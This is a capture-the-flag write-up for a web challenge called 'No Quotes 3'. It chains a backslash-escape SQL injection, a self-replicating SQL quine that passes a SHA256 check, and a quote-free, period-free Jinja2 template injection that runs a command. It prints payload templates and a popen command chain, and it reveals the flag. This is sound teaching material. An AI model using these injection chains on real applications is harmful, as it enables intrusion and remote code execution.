# No Quotes 3 — Web

## Summary
This challenge is the final evolution of the "No Quotes" series, requiring SQL injection via backslash escape, a self-replicating SQL quine with SHA256 hash verification, and Server-Side Template Injection (SSTI) without using quotes or periods for remote code execution.

## Challenge Evolution

| Challenge | Verification | Technique Required |
|-----------|--------------|-------------------|
| No Quotes 1 | None | SQL Injection + SSTI |
| No Quotes 2 | Row matching | SQL Quine (self-replicating query) |
| No Quotes 3 | Row + SHA256 hash | SQL Quine with hash verification + Period-free SSTI |


## Complete Attack Chain

```
1. Build SSTI payload
   └─> Extract characters from lipsum|string and request|string
   └─> Construct attribute names: __globals__, __getitem__, os, popen, read
   └─> Use |attr filter to avoid periods
   └─> Result: 1101 character payload without quotes or periods

2. Build SQL Quine
   └─> Username: SSTI_payload + \
   └─> Password: SQL quine template with SHA2()
   └─> Verify: SHA256(password) matches what MySQL will produce

3. Exploit
   └─> POST /login with crafted credentials
   └─> SQL injection succeeds
   └─> Hash verification passes (quine property)
   └─> Session stores SSTI payload as username
   └─> /home renders template with SSTI
   └─> Command executes: /readflag
   └─> Flag returned in response
```

## Technical Details

### SQL Quine Internals

**Template:**
```sql
) UNION SELECT 0x<user_hex>, SHA2(REPLACE(0x$, CHAR(36), LOWER(HEX(0x$))), 256) --
```

**Execution Flow:**
1. MySQL parses: `REPLACE(0x$, CHAR(36), LOWER(HEX(0x$)))`
2. `0x$` contains the template in hex with `$` as placeholder (CHAR(36))
3. `HEX(0x$)` produces the uppercase hex encoding
4. `LOWER(HEX(0x$))` converts to lowercase (matching Python's hex output)
5. `REPLACE` substitutes `$` with the hex string
6. Result is exactly the password we sent
7. `SHA2(..., 256)` hashes it to match Python's verification

**Why it works:**
```python
# Python side:
password = template.replace('$', template.encode().hex())
expected_hash = hashlib.sha256(password.encode()).hexdigest()

# MySQL side:
result = REPLACE(template_hex, '$', LOWER(HEX(template_hex)))
actual_hash = SHA2(result, 256)

# They match because:
# - HEX() in MySQL produces the same as .hex() in Python (except case)
# - LOWER() normalizes to lowercase
# - SHA2(x, 256) produces same format as sha256(x).hexdigest()
```

### Character Extraction Sources

**lipsum|string:**
```
<function generate_lorem_ipsum at 0x784a96babd80>
```
Provides: `<`, `f`, `u`, `n`, `c`, `t`, `i`, `o`, `g`, `e`, `r`, `a`, `l`, `_`, `m`, `p`, `s`, `x`, `7`, `4`, `6`, `b`, `d`, `8`, `0`, `>`

**request|string:**
```
<Request 'http://no-quotes-3-069c0da32bc4052a.chals.uoftctf.org/home' [GET]>
```
Provides: `/`, `:`, `-`, `[`, `]`, and digits

**Combined:** Sufficient to build all required strings (`__globals__`, `os`, `popen`, etc.)

### Jinja2 Filter Chain

```python
# Traditional (blocked):
{{lipsum.__globals__['os'].popen('/readflag').read()}}

# With periods blocked, use |attr:
{{lipsum|attr('__globals__')}}

# With quotes also blocked, use character extraction:
{{lipsum|attr(BUILD_STRING('__globals__'))}}

# Full chain without quotes or periods:
{{((((lipsum|attr(GLOBALS))|attr(GETITEM)(OS))|attr(POPEN)(CMD))|attr(READ)())}}
```

## Why "Recursion Theorem Moment"?

The flag `uoftctf{r3cuR510n_7h30R3M_m0M3n7}` references **Kleene's Recursion Theorem** in computability theory, which proves that programs can access their own source code. A SQL quine is a practical application of this theorem - the query produces its own source, enabling self-verification through hashing.

## Flag
```
uoftctf{r3cuR510n_7h30R3M_m0M3n7}
```

## Key Takeaways

1. **SQL Quines**: Self-replicating queries can bypass hash verification by producing their own hash
2. **Character Extraction**: When special characters are blocked, build them from available sources
3. **Jinja2 Filters**: The `|attr` filter provides attribute access without periods
4. **Defense in Depth**: Multiple vulnerabilities (SQLi + SSTI) create powerful attack chains
5. **Parametric Thinking**: Understanding mathematical properties (like quines) enables creative bypasses

## References

- [SQL Quine Technique - shysecurity.com](https://www.shysecurity.com/post/20140705-SQLi-Quine)
- [DUCTF sqli2022 writeup - justinsteven.com](https://www.justinsteven.com/posts/2022/09/27/ductf-sqli2022/)
- [Kleene's Recursion Theorem - Wikipedia](https://en.wikipedia.org/wiki/Kleene%27s_recursion_theorem)
- [Jinja2 Template Designer Documentation](https://jinja.palletsprojects.com/en/3.0.x/templates/)
